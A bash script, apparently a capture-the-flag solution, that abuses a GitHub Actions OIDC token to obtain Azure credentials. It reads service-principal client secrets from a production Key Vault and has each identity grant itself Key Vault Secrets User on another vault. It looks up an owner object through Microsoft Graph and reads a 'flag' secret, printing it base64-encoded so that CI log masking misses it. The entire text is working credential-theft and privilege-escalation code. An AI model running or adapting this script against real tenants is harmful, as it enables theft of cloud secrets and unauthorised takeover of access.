#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"
KVSCOPE="subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
SU="/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
FLAG="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
OWNER=d2cdf247-9319-40cb-8324-5a005ef538da

J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
oidc(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
VT=$(oidc https://vault.azure.net/.default)

declare -A CID SEC
for s in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do
  js=$(curl -sS "$PROD/$s-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  CID[$s]=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or d.get("clientId") or "")')
  SEC[$s]=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or d.get("password") or "")')
done
sp_tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=${CID[$1]}" -d grant_type=client_credentials --data-urlencode "client_secret=${SEC[$1]}" --data-urlencode "scope=$2" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }

declare -A OID=( [oidc]=63e87ab1-6bd2-4e80-92be-943450b20e4f [cost-reader]=1fe7a412-82e9-4135-ab4b-72a0be429adb [directory-audit]=696cace1-fb1c-4ef3-a9b1-e9abe1681513 [reporting-service]=732dfdbc-e325-4e9f-9ca9-359af1197807 [reporting-viewer]=eca94ded-76e6-4bb7-b435-40543a8c6b5f [secrets-sync]=c15570ad-5fd2-430c-97bb-a49e9a08d95c [sync-service]=70a07660-06bb-4396-b754-59fbad0b143e )

echo "### identify $OWNER (directory-audit Graph)"
g=$(sp_tok directory-audit https://graph.microsoft.com/.default)
for path in "directoryObjects/$OWNER" "groups/$OWNER" "groups/$OWNER/members" "users/$OWNER"; do
  echo "-- $path: $(curl -sS "https://graph.microsoft.com/v1.0/$path?\$select=id,displayName,userPrincipalName" -H "Authorization: Bearer $g" | tr -d '\n' | head -c 240)"
done

echo "### self-grant Secrets User per identity (HTTP code)"
grant(){ rid=$(python3 -c 'import uuid;print(uuid.uuid4())'); echo "   $3 -> $(curl -sS -o /dev/null -w '%{http_code}' -X PUT "https://management.azure.com/$KVSCOPE/providers/Microsoft.Authorization/roleAssignments/$rid?api-version=2022-04-01" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"properties\":{\"roleDefinitionId\":\"$SU\",\"principalId\":\"$2\",\"principalType\":\"ServicePrincipal\"}}")"; }
grant "$(oidc https://management.azure.com/.default)" "${OID[oidc]}" oidc
for s in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do grant "$(sp_tok "$s" https://management.azure.com/.default)" "${OID[$s]}" "$s"; done

echo "### wait"; sleep 40
echo "### read flag per identity (base64)"
echo "-- oidc: $(curl -sS "$FLAG" -H "Authorization: Bearer $VT" | head -c 400 | base64 -w0)"
for s in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do
  echo "-- $s: $(curl -sS "$FLAG" -H "Authorization: Bearer $(sp_tok "$s" https://vault.azure.net/.default)" | head -c 400 | base64 -w0)"
done
echo END
